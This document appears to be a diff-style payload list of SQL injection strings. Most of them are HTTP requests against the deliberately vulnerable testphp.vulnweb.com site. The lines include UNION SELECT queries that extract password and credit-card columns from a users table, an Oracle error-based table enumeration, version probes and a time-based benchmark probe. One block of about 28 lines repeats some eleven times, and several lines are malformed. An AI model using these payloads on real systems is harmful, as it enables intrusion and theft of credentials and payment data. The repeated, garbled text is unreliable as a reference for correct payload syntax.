+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
